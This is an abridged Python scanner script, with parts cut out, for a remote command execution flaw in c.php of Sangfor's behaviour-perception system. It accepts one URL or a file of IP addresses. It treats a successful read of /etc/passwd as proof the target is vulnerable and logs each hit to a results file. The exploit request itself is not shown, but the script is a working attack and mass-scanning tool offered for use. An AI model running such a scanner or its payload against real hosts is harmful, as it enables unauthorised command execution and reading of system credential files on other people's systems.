...
def title():
    print("""
                           深信服 行为感知系统c.php远程命令执行漏洞
                      use: python3 sanfor_Behavior_perception_sys_rce.py
                                 Author: kento-sec
    """)
    ...
    def target_url(self):
        ...
        try:
            ...
            if 'host' in rt and etc_passwd.status_code == 200:
                print("\033[32m[o]" + self.url + "存在深信服 行为感知系统c.php远程命令执行漏洞!" + "\033[0m")
                with open("深信服行为感知系统c.php远程命令执行漏洞结果.txt", mode="a") as rp:
                    rp.write(self.url +" 漏洞位置："+etc_passwd.url+ "\n")
            elif etc_passwd.status_code == 404:
                print(self.url+' 不存在深信服行为感知系统c.php远程命令执行漏洞！')
            else:
                print(self.url + ' 不存在深信服行为感知系统c.php远程命令执行漏洞！')
                pass
...
if __name__ == "__main__":
    ...
    if len(sys.argv) != 3:
        print(
            "[-]  参数错误！\neg1:>>>python3 sanfor_Behavior_perception_sys_rce.py -u http://127.0.0.1\neg2:>>>python3 sanfor_Behavior_perception_sys_rce.py -f ip.txt")
    elif args.url:
